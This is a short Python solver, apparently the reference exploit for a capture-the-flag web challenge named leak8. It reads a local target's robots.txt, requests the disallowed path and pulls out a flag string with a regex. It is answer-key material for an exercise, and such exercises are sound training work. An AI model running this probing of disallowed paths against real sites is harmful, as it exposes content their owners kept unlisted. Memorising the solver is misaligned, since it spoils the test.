#!/usr/bin/env python3
"""Reference exploit for leak8 (formerly leak-robots).

Read robots.txt to find the disallowed path, then fetch it for the flag.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8017")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)
    rb = requests.get(BASE + "/robots.txt", timeout=5).text
    path = None
    for line in rb.splitlines():
        if line.lower().startswith("disallow:"):
            path = line.split(":", 1)[1].strip().lstrip("/")
    if not path:
        sys.stderr.write("no disallow directive\n")
        return 1
    r = requests.get(BASE + "/" + path, timeout=5)
    m = re.search(r"flag\{[^}]*\}", r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write("no flag at disallowed path\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
